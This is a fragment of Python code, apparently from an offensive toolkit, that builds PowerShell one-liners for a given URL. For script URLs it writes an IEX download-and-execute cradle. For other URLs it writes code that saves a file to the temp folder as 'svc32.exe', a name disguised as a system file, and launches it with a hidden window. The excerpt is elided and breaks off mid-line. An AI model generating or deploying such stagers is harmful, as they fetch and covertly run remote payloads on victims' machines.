...
def _is_ipv6_url(url):
    import re
    return bool(re.search(r'http[s]?://\[', url))
...
def build_ca_ps(url):
    ...
    if _is_ipv6_url(url):
        ...
        if url.endswith('.ps1'):
            ps = ssl + dl + "IEX $_wc.DownloadString($_u)"
        else:
            ps = (ssl + dl +
                  "$p=$env:TEMP+'\\svc32.exe';"
                  "$_wc.DownloadFile($_u,$p);"
                  "Start-Process $p -WindowStyle Hidden")
    else:
        if url.endswith('.ps1'):
            ps = ssl + f"IEX (New-Object Net.WebClient).DownloadString('{url}')"
        else:
            ps = (
                ssl +
                f"$p=$env:TEMP+'\\svc32.exe';"
